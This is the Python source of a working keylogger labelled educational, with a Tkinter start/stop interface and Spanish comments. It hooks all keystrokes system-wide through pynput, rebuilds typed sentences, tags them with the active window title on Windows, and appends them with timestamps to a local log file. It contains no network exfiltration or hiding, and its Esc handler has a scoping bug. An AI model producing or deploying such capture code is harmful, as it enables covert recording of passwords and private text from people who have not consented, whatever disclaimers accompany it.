"""
Keylogger Educativo Simple
Creado con fines exclusivamente educativos para demostrar técnicas de seguridad.
NO debe ser utilizado para actividades maliciosas o sin consentimiento.
"""

import os
from tkinter import CENTER, RIGHT, LEFT, Tk, Button, Label, Frame
from tkinter import Text, Scrollbar, Menu, messagebox
from pynput import keyboard
from typing import Any, List
from datetime import datetime
import time

try:
    # Para capturar la ventana activa (solo Windows)
    import win32gui
    has_window_capture = True
except ImportError:
    has_window_capture = False

# Variables globales
current_sentence: List[Any] = []
last_window_title: str = ""

# Nuestro listener del teclado - definido globalmente para gestionar el reinicio
listener = None


def ensure_output_directory():
    """
    Asegura que el directorio de salida exista para evitar errores al escribir archivos.
    """
    os.makedirs("./out", exist_ok=True)


def get_active_window_title() -> str:
    """
    Obtiene el título de la ventana activa actual.
    
    Returns:
        str: Título de la ventana activa o "Desconocido" si no se puede obtener
    """
    if not has_window_capture:
        return "Desconocido"
    
    try:
        window = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(window)
        return window_title if window_title else "Desconocido"
    except:
        return "Desconocido"


def format_sentence(key_list: List[Any]) -> str:
    """
    Formatea una lista de teclas en una oración legible.
    
    Args:
        key_list (list): Lista de teclas presionadas
        
    Returns:
        str: La oración formateada
    """
    text = ""
    for k in key_list:
        key_str = str(k)
        
        # Manejo de teclas especiales
        if "Key." in key_str:
            key_name = key_str.split(".")[1]
            if key_name == "space":
                text += " "
            elif key_name == "enter":
                text += "\n"
            elif key_name == "backspace" and text:
                text = text[:-1]  # Simula borrado
            elif key_name in ["shift", "shift_r", "shift_l", "ctrl", "ctrl_r", "ctrl_l", 
                            "alt", "alt_r", "alt_l", "cmd", "cmd_r", "cmd_l"]:
                pass  # Ignorar teclas modificadoras
            else:
                text += f"[{key_name}]"
        else:
            # Quitar comillas si existen
            cleaned_key = key_str.replace("'", "")
            text += cleaned_key
            
    return text


def generate_text_log(text: str, window_info: str = None) -> None:
    """
    Genera un archivo de registro de texto con las pulsaciones de teclas,
    organizado por oraciones y con marca de tiempo.

    Args:
        text (str): El texto a registrar
        window_info (str, optional): Información de la ventana activa
    """
    ensure_output_directory()
    
    timestamp = datetime.now().isoformat()
    entry = f"[{timestamp}] "
    
    if window_info:
        entry += f"({window_info}) "
        
    entry += f"{text}\n"
    
    # Usar modo append para no sobrescribir registros anteriores
    with open("./out/key_log.txt", "a+", encoding="utf-8") as KEYS:
        KEYS.write(entry)


def on_press(key: Any) -> None:
    """
    Maneja eventos de presión de teclas, registrando oraciones.

    Args:
        key (Any): La tecla que fue presionada.
    """
    global current_sentence, last_window_title
    
    # Capturar información de la ventana activa
    window_title = get_active_window_title()
    if window_title != last_window_title:
        # Si cambiamos de ventana, registramos lo que se ha escrito hasta ahora
        if current_sentence:
            sentence = format_sentence(current_sentence)
            if sentence.strip():  # Solo si hay algo significativo
                generate_text_log(sentence, last_window_title)
                current_sentence = []
                
        last_window_title = window_title
    
    # Agregar la tecla a la oración actual
    current_sentence.append(key)
    
    # Si se presiona Enter, registramos la oración completa
    if key == keyboard.Key.enter:
        sentence = format_sentence(current_sentence)
        generate_text_log(sentence, window_title)
        current_sentence = []


def on_release(key: Any) -> None:
    """
    Maneja eventos de liberación de teclas.

    Args:
        key (Any): La tecla que fue liberada.
    """
    # Si es la tecla Esc, esto podría ser un punto de guardado o evento especial
    if key == keyboard.Key.esc:
        # Guardar la oración actual si hay algo pendiente
        if current_sentence:
            sentence = format_sentence(current_sentence)
            if sentence.strip():  # Solo si hay algo significativo
                generate_text_log(sentence, last_window_title)
            current_sentence = []


def start_keylogger():
    """
    Inicia el keylogger, habilitando el registro de pulsaciones de teclas.
    """
    global listener
    
    # Detener el listener previo si existe
    if listener is not None:
        try:
            listener.stop()
        except:
            pass  # Ignorar errores si ya estaba detenido
    
    # Crear un nuevo listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    status_label.config(text="Estado: Capturando")
    label.config(text="[+] Keylogger en ejecución!\n[!] Guardando registros en 'out/key_log.txt'")
    start_button.config(state="disabled")
    stop_button.config(state="normal")


def stop_keylogger():
    """
    Detiene el keylogger, deteniendo el registro de pulsaciones de teclas.
    """
    global listener
    
    if listener is not None:
        listener.stop()
    
    # Vaciar la oración actual
    if current_sentence:
        sentence = format_sentence(current_sentence)
        if sentence.strip():
            generate_text_log(sentence, last_window_title)
        current_sentence.clear()
    
    status_label.config(text="Estado: Detenido")
    label.config(text="Keylogger detenido.")
    start_button.config(state="normal")
    stop_button.config(state="disabled")


def crear_menu_ayuda():
    """
    Crea un menú de ayuda con información sobre el uso educativo.
    """
    def mostrar_informacion():
        messagebox.showinfo(
            "Keylogger Educativo",
            "Esta es una herramienta creada exclusivamente con fines educativos.\n\n"
            "Características implementadas:\n"
            "- Registro de oraciones completas\n"
            "- Registro de timestamps\n"
            "- Detección de ventanas activas\n\n"
            "ADVERTENCIA: El uso de keyloggers sin consentimiento explícito es ilegal."
        )
    
    def mostrar_creditos():
        messagebox.showinfo(
            "Créditos",
            "Repositorio original en GitHub: https://github.com/ramprasathmk/keylogger.\n\n"
            "Desarrollado por: Erick Lasluisa"
        )
    
    menu_superior = Menu(root)
    root.config(menu=menu_superior)
    
    menu_ayuda = Menu(menu_superior, tearoff=0)
    menu_superior.add_cascade(label="Ayuda", menu=menu_ayuda)
    menu_ayuda.add_command(label="Acerca de", command=mostrar_informacion)
    menu_ayuda.add_command(label="Créditos", command=mostrar_creditos)


def ver_registros():
    """
    Muestra una ventana con los registros actuales.
    """
    ventana_registros = Tk()
    ventana_registros.title("Registros Capturados")
    ventana_registros.geometry("600x400")
    
    frame = Frame(ventana_registros)
    frame.pack(fill="both", expand=True)
    
    scrollbar = Scrollbar(frame)
    scrollbar.pack(side=RIGHT, fill="y")
    
    texto = Text(frame, wrap="word", yscrollcommand=scrollbar.set)
    texto.pack(side="left", fill="both", expand=True)
    
    scrollbar.config(command=texto.yview)
    
    try:
        with open("./out/key_log.txt", "r", encoding="utf-8") as archivo:
            contenido = archivo.read()
            texto.insert("1.0", contenido)
    except FileNotFoundError:
        texto.insert("1.0", "No hay registros disponibles.")
    
    ventana_registros.mainloop()


if __name__ == "__main__":
    root = Tk()
    root.title("Keylogger Educativo Simple")
    
    # Advertencia educativa
    warning_label = Label(
        root, 
        text="ADVERTENCIA: USO EXCLUSIVAMENTE EDUCATIVO",
        fg="red"
    )
    warning_label.pack(pady=5)
    
    # Descripción principal
    label = Label(
        root, 
        text='Herramienta para demostrar técnicas de captura de teclado\n'
             'en entornos controlados para fines educativos.'
    )
    label.config(anchor=CENTER)
    label.pack(pady=10)
    
    # Botones principales
    button_frame = Frame(root)
    button_frame.pack(pady=10)
    
    start_button = Button(button_frame, text="Iniciar Captura", command=start_keylogger)
    start_button.pack(side=LEFT, padx=5)
    
    stop_button = Button(button_frame, text="Detener", command=stop_keylogger, state="disabled")
    stop_button.pack(side=LEFT, padx=5)
    
    view_button = Button(button_frame, text="Ver Registros", command=ver_registros)
    view_button.pack(side=LEFT, padx=5)
    
    # Crear menú de ayuda
    crear_menu_ayuda()
    
    # Estado actual
    status_label = Label(root, text="Estado: En espera")
    status_label.pack(pady=10)
    
    root.geometry("400x250")
    root.mainloop()
